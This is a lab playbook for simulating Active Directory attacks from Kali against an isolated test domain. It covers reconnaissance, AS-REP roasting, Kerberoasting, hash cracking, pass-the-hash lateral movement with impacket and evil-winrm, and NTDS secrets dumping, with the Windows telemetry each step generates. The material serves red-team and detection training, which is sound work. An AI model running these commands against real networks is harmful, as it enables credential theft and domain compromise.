# Active Directory Lateral Movement & Attack Simulation Playbook

This playbook outlines end-to-end attack simulation workflows to be executed from the **Attacker VM (Kali Linux)** against the Active Directory lab environment (`adlab.test`).

---

## Lab Architecture & Target Matrix

| Role | Hostname | IP Address | Operating System | Domain |
| :--- | :--- | :--- | :--- | :--- |
| **Domain Controller** | `DC01` | `192.168.56.10` | Windows Server | `adlab.test` |
| **Domain Workstation 1** | `CLIENT01` | `192.168.56.20` | Windows Client | `adlab.test` |
| **Domain Workstation 2** | `CLIENT02` | `192.168.56.21` | Windows Client | `adlab.test` |
| **Attacker / Monitoring** | `KALI` | `192.168.56.50` | Kali Linux ARM64 | Isolated Lab Net |

---

## Phase 1: Active Directory Reconnaissance

### 1. Port & Service Discovery
From Kali Linux:
```bash
# Quick port scan of the Domain Controller and Client
nmap -sS -p 53,88,135,139,389,445,636,3268,3389,5985 192.168.56.10,20,21 -oN nmap_ad_scan.txt

# Inspect SMB and domain info using NetExec (or CrackMapExec)
nxc smb 192.168.56.10
```

### 2. User & Password Policy Enumeration (Anonymous / SMB Null Session)
```bash
# Check for null sessions or guest access
nxc smb 192.168.56.10 -u '' -p '' --users
nxc smb 192.168.56.10 -u 'guest' -p '' --pass-pol
```

### 3. BloodHound Domain Ingestion
Using `bloodhound-python` from Kali with valid initial user credentials (e.g. `asmith:Winter2026!Corporate`):
```bash
bloodhound-python -u 'asmith' -p 'Winter2026!Corporate' -d 'adlab.test' -dc 'dc01.adlab.test' -ns '192.168.56.10' -c All --zip
```
Import the resulting `.zip` file into BloodHound CE / Neo4j to visualize attack paths (e.g. `Find Shortest Paths to Domain Admins`).

---

## Phase 2: Credential Extraction (Roasting Attacks)

### Attack 1: AS-REP Roasting (`svc_backup`)
Target account `svc_backup` has Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = $true`). We can request an AS-REP ticket without providing a password!

```bash
# 1. Request AS-REP hash using impacket
impacket-GetNPUsers 'adlab.test/' -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 192.168.56.10

# Or directly target svc_backup:
impacket-GetNPUsers 'adlab.test/svc_backup' -no-pass -format hashcat -outputfile asrep_svc_backup.txt -dc-ip 192.168.56.10

# 2. Crack the hash with Hashcat (Mode 18200: Kerberos 5 AS-REP etype 23)
hashcat -m 18200 -a 0 asrep_svc_backup.txt /usr/share/wordlists/rockyou.txt
```
> **Telemetry Generated**: Windows Security Event ID `4768` (Kerberos Authentication Ticket requested) with Ticket Encryption Type `0x17` (RC4) and Pre-Auth Type `0` (None).

---

### Attack 2: Kerberoasting (`svc_sql`)
Target account `svc_sql` has an SPN (`MSSQLSvc/dc01.adlab.test:1433`) registered. Any authenticated domain user can request a TGS ticket encrypted with the service account's password hash!

```bash
# 1. Request Kerberos TGS tickets for all SPNs
impacket-GetUserSPNs 'adlab.test/asmith:Winter2026!Corporate' -dc-ip 192.168.56.10 -request -outputfile kerberoast_hashes.txt

# 2. Crack the TGS hash with Hashcat (Mode 13100: Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```
> **Telemetry Generated**: Windows Security Event ID `4769` (A Kerberos service ticket was requested) where Ticket Options has `0x40810000` and Ticket Encryption Type is `0x17`.

---

## Phase 3: Lateral Movement Techniques

### Technique 1: Pass-the-Hash (PtH) with WMI (`impacket-wmiexec`)
When an NTLM hash has been dumped or recovered (e.g. Local Admin or Domain Admin hash):

```bash
# Execute remote commands over DCOM/WMI (Port 135 + high RPC ports)
impacket-wmiexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.56.20 "whoami"
```
> **Telemetry Generated**:
> - Windows Event ID `4624` (Logon Type 3: Network Logon, NTLM V2, Key Length 0).
> - Sysmon Event ID `1`: Parent process `wmiprvse.exe` spawning `cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__...`.

---

### Technique 2: Service-Based Lateral Movement (`impacket-psexec`)
Executes code by dynamically creating a remote service and named pipe:

```bash
# Execute interactive shell over SMB (Port 445)
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.56.20
```
> **Telemetry Generated**:
> - Windows Event ID `7045` (A new service was installed in the system: service binary uploaded to `ADMIN$`).
> - Sysmon Event ID `17/18` (Pipe Created / Pipe Connected with names matching `*psexec*` or random hex).

---

### Technique 3: WinRM / PowerShell Remoting (`evil-winrm`)
Using legitimate administrative protocols (Port 5985 HTTP / 5986 HTTPS):

```bash
# Connect with cleartext password:
evil-winrm -i 192.168.56.20 -u 'bwayne' -p 'Winter2026!Corporate'

# Or connect with Pass-the-Hash:
evil-winrm -i 192.168.56.20 -u 'Administrator' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```
> **Telemetry Generated**:
> - Windows Event ID `4624` (Logon Type 3, Network, Authentication Package `Kerberos` or `NTLM`).
> - Sysmon Event ID `1`: Parent process `wsmprovhost.exe` spawning `powershell.exe`.
> - PowerShell Event ID `4104` (Script Block Execution).

---

### Technique 4: Active Directory Secrets Dumping (`secretsdump.py`)
Once local admin on DC01 is obtained, extract NTDS.dit hashes:

```bash
# Dump all Active Directory domain hashes using Volume Shadow Copy (VSS) via DRSUAPI
impacket-secretsdump 'adlab.test/Administrator:P@ssw0rd2026!AD@192.168.56.10' -outputfile ntds_dump
```
